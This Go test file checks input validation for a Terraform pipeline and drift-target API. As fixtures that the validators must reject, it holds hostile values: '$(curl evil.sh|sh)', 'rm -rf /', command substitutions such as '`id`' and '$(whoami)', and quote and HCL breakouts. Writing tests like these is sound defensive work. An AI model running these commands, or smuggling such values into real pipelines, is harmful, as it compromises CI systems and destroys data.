package api

import (
	"fmt"
	"strings"
	"testing"
)

func TestValidatePipelineInputs_Valid(t *testing.T) {
	cases := []struct {
		name             string
		workingDir       string
		repoRef          string
		tfVersion        string
		registryHost     string
		providerVersions map[string]string
		moduleVersions   map[string]string
	}{
		{name: "empty", providerVersions: map[string]string{}, moduleVersions: map[string]string{}},
		{name: "typical", workingDir: "envs/prod", repoRef: "release/1.2", tfVersion: "1.9.5", registryHost: "registry.example.com:8443",
			providerVersions: map[string]string{"aws": ">= 5.40, < 6.0", "azurerm": "~> 3.0"},
			moduleVersions:   map[string]string{"network-core": "2.1.0"}},
		{name: "latest", tfVersion: "latest"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validatePipelineInputs(tc.workingDir, tc.repoRef, tc.tfVersion, tc.registryHost, tc.providerVersions, tc.moduleVersions); err != nil {
				t.Fatalf("expected valid, got error: %v", err)
			}
		})
	}
}

// TestValidateDriftTargets_Valid pins the accepted shapes: a handful of
// distinct targets, and any number of "untracked" targets (empty source_id AND
// state_key) which are exempt from the duplicate check because there is no
// detection identity to collide on.
func TestValidateDriftTargets_Valid(t *testing.T) {
	cases := []struct {
		name  string
		items []DriftTargetItem
	}{
		{name: "empty", items: nil},
		{name: "one legacy-shaped item", items: []DriftTargetItem{{SourceID: "s1", StateKey: "app.tfstate", WorkingDir: "infra/"}}},
		{name: "several distinct targets", items: []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/"},
			{SourceID: "s1", StateKey: "app2.tfstate", WorkingDir: "app2/"},
			{SourceID: "s2", StateKey: "app1.tfstate", WorkingDir: "app3/"},
		}},
		{name: "many untracked targets (no source_id/state_key) are not duplicates of each other", items: []DriftTargetItem{
			{WorkingDir: "a/"}, {WorkingDir: "b/"}, {WorkingDir: "c/"},
		}},
		{name: "exactly the cap", items: makeDriftTargetItems(maxDriftTargets)},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validateDriftTargets(tc.items); err != nil {
				t.Fatalf("expected valid, got error: %v", err)
			}
		})
	}
}

func makeDriftTargetItems(n int) []DriftTargetItem {
	items := make([]DriftTargetItem, n)
	for i := range items {
		items[i] = DriftTargetItem{SourceID: "s1", StateKey: fmt.Sprintf("app%d.tfstate", i), WorkingDir: fmt.Sprintf("app%d/", i)}
	}
	return items
}

// TestValidateDriftTargets_Rejects pins the three refusals: a per-item
// injection attempt, more than maxDriftTargets items, and a repeated
// (source_id, state_key) pair within one request.
func TestValidateDriftTargets_Rejects(t *testing.T) {
	t.Run("injection in one item's working_dir", func(t *testing.T) {
		items := []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/"},
			{SourceID: "s1", StateKey: "app2.tfstate", WorkingDir: "$(curl evil.sh|sh)"},
		}
		if err := validateDriftTargets(items); err == nil {
			t.Fatal("expected rejection for shell-hostile working_dir")
		}
	})
	t.Run("over the cap", func(t *testing.T) {
		if err := validateDriftTargets(makeDriftTargetItems(maxDriftTargets + 1)); err == nil {
			t.Fatal("expected rejection for exceeding maxDriftTargets")
		}
	})
	t.Run("duplicate source_id+state_key", func(t *testing.T) {
		items := []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/"},
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1-again/"},
		}
		if err := validateDriftTargets(items); err == nil {
			t.Fatal("expected rejection for a duplicate (source_id, state_key) pair")
		}
	})
	// state_key is embedded in the "targets" CI template parameter under
	// fan-out, so shell/YAML-hostile characters are refused -- while keys
	// that are merely looser than a directory name stay legal.
	t.Run("hostile characters in state_key", func(t *testing.T) {
		for _, key := range []string{
			"app.tfstate\"; curl evil.sh|sh #",
			"app`id`.tfstate",
			"$(whoami).tfstate",
			"app\n.tfstate",
			"app<x>.tfstate",
		} {
			items := []DriftTargetItem{{SourceID: "s1", StateKey: key, WorkingDir: "app/"}}
			if err := validateDriftTargets(items); err == nil {
				t.Errorf("expected rejection for state_key %q", key)
			}
		}
	})
	t.Run("legitimately loose state_key is accepted", func(t *testing.T) {
		for _, key := range []string{"env=prod/app.tfstate", "oci/APP1958.tfstate", "team a/app.tfstate", "app-1.2_3.tfstate"} {
			items := []DriftTargetItem{{SourceID: "s1", StateKey: key, WorkingDir: "app/"}}
			if err := validateDriftTargets(items); err != nil {
				t.Errorf("state_key %q should be accepted: %v", key, err)
			}
		}
	})
	t.Run("state_key over the length cap", func(t *testing.T) {
		items := []DriftTargetItem{{SourceID: "s1", StateKey: strings.Repeat("k", maxStateKeyLen+1), WorkingDir: "app/"}}
		if err := validateDriftTargets(items); err == nil {
			t.Fatal("expected rejection for an over-long state_key")
		}
	})
}

func TestValidatePipelineInputs_RejectsInjection(t *testing.T) {
	cases := []struct {
		name             string
		workingDir       string
		repoRef          string
		tfVersion        string
		registryHost     string
		providerVersions map[string]string
		moduleVersions   map[string]string
	}{
		{name: "working_dir shell", workingDir: "$(curl evil.sh|sh)"},
		{name: "working_dir semicolon", workingDir: ".; rm -rf /"},
		{name: "working_dir backtick", workingDir: "`id`"},
		{name: "repo_ref injection", repoRef: "main\"; touch pwned; #"},
		{name: "tf_version space", tfVersion: "1.9.5 && id"},
		{name: "registry_host path", registryHost: "evil.com/x\"}}}#"},
		{name: "registry_host space", registryHost: "evil.com x"},
		{name: "provider name uppercase/quote", providerVersions: map[string]string{"aws\"": "1.0"}},
		{name: "provider version hcl breakout", providerVersions: map[string]string{"aws": "1.0\" }; provider \"x\" {"}},
		{name: "module name slash", moduleVersions: map[string]string{"net/work": "1.0"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validatePipelineInputs(tc.workingDir, tc.repoRef, tc.tfVersion, tc.registryHost, tc.providerVersions, tc.moduleVersions); err == nil {
				t.Fatalf("expected rejection, got nil error")
			}
		})
	}
}
